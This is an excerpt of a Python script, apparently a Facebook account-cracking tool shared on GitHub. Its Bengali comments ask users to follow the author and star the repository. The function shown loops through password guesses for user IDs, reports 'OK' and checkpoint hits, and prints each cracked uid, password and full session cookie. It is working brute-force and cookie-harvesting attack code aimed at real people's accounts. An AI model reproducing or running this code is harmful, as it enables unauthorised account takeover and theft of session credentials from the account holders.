#Script তো নিতে আসলা একাউন্ট টা ফলো করলে কি হয় হুম😕
#একাউন্ট ফলো আর এই Respotary তে একটা Star দিয়া যাইও😊
#----------------------------------------------------------------------------------------------------------
#CREATE BY : SAUM AHMED SABBIR
#WHATSAPP : +8801630982935
#GITHUB : https://github.com/m1ndpl4yers4bb1r
#----------------------------------------------------------------------------------------------------------
...
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[SABBIR]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[SABBIR-OK] {uid}|{ps} \nCookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[SABBIR-CP] {cid}|{ps}")
